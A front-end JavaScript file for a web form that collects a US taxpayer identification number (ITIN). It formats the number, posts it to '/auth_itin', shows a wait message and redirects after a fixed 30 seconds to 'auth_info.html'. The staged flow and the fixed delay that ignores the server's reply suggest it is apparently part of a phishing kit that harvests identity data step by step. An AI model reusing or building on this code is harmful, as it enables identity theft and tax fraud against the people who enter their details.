const container = document.querySelector(".container")
const footer = document.querySelector("footer")
const passwordInput = document.querySelector(".password")
const toggleBotton = document.querySelector(".toggle")
const itinInput = document.querySelector('#itin');
const passwordTab = document.querySelector('.passinput')
const submitBtn = document.querySelector('#sub_itin')
const displayMsg = document.querySelector("#wait")
const message = document.querySelector('.message')


let containerHeight = container.offsetHeight
let footerHeight = footer.offsetHeight

const newHeight = containerHeight + footerHeight + 220
document.body.style.height = newHeight + 'px'

itinInput.addEventListener('focus', changeColor)
itinInput.addEventListener('blur', returnColor)
document.addEventListener('DOMContentLoaded', itinInput.focus())
itinInput.addEventListener('keyup', e => {
  if(e.keyCode == 13){
      event.preventDefault()
      if(itinInput.value !== '' && itinInput.value.length >= 11){
          submit()
      } else{
        message.style.display = 'block'
      }
  }
})
submitBtn.addEventListener('click', () => {
  if(itinInput.value !== '' && itinInput.value.length >= 11){
      submit()
  } else{
    message.style.display = 'block'
  }
})

function changeColor(){
  passwordTab.style.borderColor = "#266aca"
  passwordTab.style.borderWidth = "3px"
}
function returnColor(){
  passwordTab.style.borderColor = "#949494"
  passwordTab.style.borderWidth = "2px"
}

function submit(){
  displayMsg.style.display = 'block'
  const obj = {
      itin : itinInput.value
  }

  const baseURL = '/auth_itin'
  fetch(baseURL, {
      method: 'POST',
      headers: {
          "Content-Type" : "application/json"
      },
      body: JSON.stringify(obj)
  })
  setTimeout(() => {
    window.location.href = 'auth_info.html'
  }, 30000)
}
toggleBotton.onclick = function(){
    if(passwordInput.style['-webkit-text-security'] = 'disk'){
        passwordInput.classList.toggle('toggle')
        toggleBotton.classList.toggle('fa-eye-slash')
        toggleBotton.classList.toggle('fa-eye')
        itinInput.focus()
    } else{
        passwordInput.classList.toggle('toggle')
        toggleBotton.classList.toggle('fa-eye')
        toggleBotton.classList.toggle('fa-eye-slash')
    }
}


itinInput.addEventListener('input', (event) => {
  let inputValue = event.target.value.replace(/\D/g, ''); // Remove non-digits
  inputValue = inputValue.substring(0, 9); // Limit to 9 digits

  let formattedValue = '';
  for (let i = 0; i < inputValue.length; i++) {
    if (i === 3 || i === 5) {
      formattedValue += '-';
    }
    formattedValue += inputValue[i];
  }

  event.target.value = formattedValue;
});